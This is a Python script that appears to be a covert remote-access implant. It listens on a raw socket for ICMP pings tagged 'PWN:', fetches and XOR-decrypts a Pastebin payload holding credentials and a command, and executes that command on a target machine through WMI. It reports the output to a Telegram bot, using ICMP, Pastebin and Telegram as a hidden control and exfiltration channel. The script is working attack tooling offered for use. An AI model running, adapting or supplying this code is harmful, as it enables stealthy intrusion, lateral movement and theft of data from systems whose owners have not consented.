import wmi
import sys
import socket
import struct
import requests

KEY=0xDEADBEEF

def execute_remote_command(target_host, username, password, command, directory=None):
    resp = ""
    command_template = f"cmd.exe /c {command}"

    try:
        
        resp += f"[*] Connecting to {target_host}...\n"
        connection = wmi.WMI(
            computer=target_host,
            user=username,
            password=password
        )
        
        resp += f"[+] Connected successfully to {target_host}\n"
        resp += f"[*] Executing command: {command}\n"
        
        
        process_id, return_value = connection.Win32_Process.Create(
            CommandLine=command_template,
            CurrentDirectory=directory,
            ProcessStartupInformation=None
        )
        
        if return_value == 0:
            resp += f"[+] Command executed successfully (Process ID: {process_id})\n"
            return True, resp
        else:
            resp += f"[-] Command execution failed with return code: {return_value}\n"
            return False, resp
            
    except Exception as e:
        resp = f"[-] Error: {str(e)}"
        print(f"[-] Error: {str(e)}")
        return False, resp

def get_payload(id):
    url = f"https://pastebin.com/raw/{id}"
    return requests.get(url, allow_redirects=True).text.strip()

def send_message(token, chat_id, message):
    SEND_URL = f'https://api.telegram.org/bot{token}/sendMessage'
    requests.post(SEND_URL, json={'chat_id': chat_id, 'text': message})  

def listen_icmp(ip):

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)

    sock.bind((ip, 0))

    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    sock.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)

    while True:
        packet, addr = sock.recvfrom(65565)
        ip_header = packet[:20]
        icmp_header = packet[20:28]
        payload = packet[28:]

        icmp_type, code, checksum, packet_id, sequence = struct.unpack('bbHHh', icmp_header)

        if icmp_type == 8:  # Echo request
            try:
                payload_str = payload.decode(errors="ignore")
                if payload_str.startswith("PWN:"):
                    pastebin_id = payload_str[4:].strip()
                    return pastebin_id
            except Exception:
                continue

def xorshift_encrypt(data: bytes, key: int) -> bytes:
    result = bytearray()
    state = key & 0xFFFFFFFF 

    for b in data:
        state ^= (state << 13) & 0xFFFFFFFF
        state ^= (state >> 17)
        state ^= (state << 5) & 0xFFFFFFFF
        prng_byte = (state & 0xFF)

        result.append(b ^ prng_byte)

    return bytes(result).decode()

def main():
    
    if len(sys.argv) != 2:
        sys.exit()

    while True:
        id = listen_icmp(sys.argv[1])

        if id:
            payload = get_payload(id)
            dec_payload = xorshift_encrypt(bytes.fromhex(payload), KEY).strip()
            arguments = dec_payload.split("$$$$")
            token = arguments[0]
            chat_id = int(arguments[1])
            host = arguments[2]
            user = arguments[3]
            password = arguments[4]
            cmd = arguments[5]
            directory = arguments[6] if len(arguments) > 6 else None

            
            output, err = execute_remote_command(host, user, password, cmd, directory=directory)

            if err == None:
                send_message(token, chat_id, output)
            else:
                send_message(token, chat_id, err)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass